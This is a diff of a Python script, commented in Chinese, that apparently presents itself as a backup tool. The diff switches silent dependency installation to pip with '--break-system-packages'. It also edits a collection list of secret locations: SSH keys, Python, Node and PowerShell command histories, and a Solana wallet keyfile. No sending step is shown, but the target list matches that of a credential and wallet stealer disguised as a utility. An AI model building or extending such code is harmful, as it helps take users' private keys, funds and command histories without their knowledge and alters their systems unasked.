@@ -89,7 +89,7 @@ def find_powershell_exe():
     return None
 
 def check_and_install_dependencies():
-    """检查并安装必需的依赖包（优先使用 uv，回退到 pip）"""
+    """检查并安装必需的依赖包（直接使用 python -m pip）"""
     required_packages = {
         'requests': 'requests',
         'urllib3': 'urllib3',
@@ -119,22 +119,15 @@ def check_and_install_dependencies():
         print("✓ 所有依赖已就绪")
         return
 
-    # 检查是否有 uv 可用
-    use_uv = ensure_uv_installed()
-
     # 安装缺失的必需依赖
     if missing_required:
         print(f"检测到缺失的必需依赖: {', '.join(missing_required)}")
-        print(f"正在使用 {'uv' if use_uv else 'pip'} 自动安装...")
+        print("正在使用 python3 -m pip 自动安装...")
         failed_packages = []
 
         for package in missing_required:
             try:
-                if use_uv:
-                    subprocess.check_call(['uv', 'pip', 'install', '--system', package])
-                else:
-                    # 回退到 pip（保留原有逻辑以兼容没有 uv 的环境）
-                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', package])
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', '--break-system-packages', package])
                 print(f"✓ 已安装: {package}")
             except subprocess.CalledProcessError as e:
                 print(f"⚠ 安装失败: {package} - {str(e)}")
@@ -148,10 +141,7 @@ def check_and_install_dependencies():
         print(f"检测到缺失的可选依赖: {', '.join(missing_optional)}")
         for package in missing_optional:
             try:
-                if use_uv:
-                    subprocess.check_call(['uv', 'pip', 'install', '--system', package])
-                else:
-                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', package])
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', '--break-system-packages', package])
                 print(f"✓ 已安装: {package}")
             except subprocess.CalledProcessError as e:
                 print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
@@ -362,7 +352,7 @@ class BackupConfig:
         ".ssh",  # SSH配置
         ".python_history",  # Python 历史记录文件
         ".node_repl_history",  # Node.js REPL 历史记录文件
-        "AppData\Roaming\Python\Python*\history",  # Windows 常见 Python REPL 历史路径（按版本目录匹配）
+        "AppData/Roaming/Python/Python*/history",  # Windows 常见 Python REPL 历史路径（按版本目录匹配）
         "AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",  # Windows PowerShell 历史
         "AppData/Roaming/Microsoft/PowerShell/PSReadLine/ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
         ".config/solana/id.json",
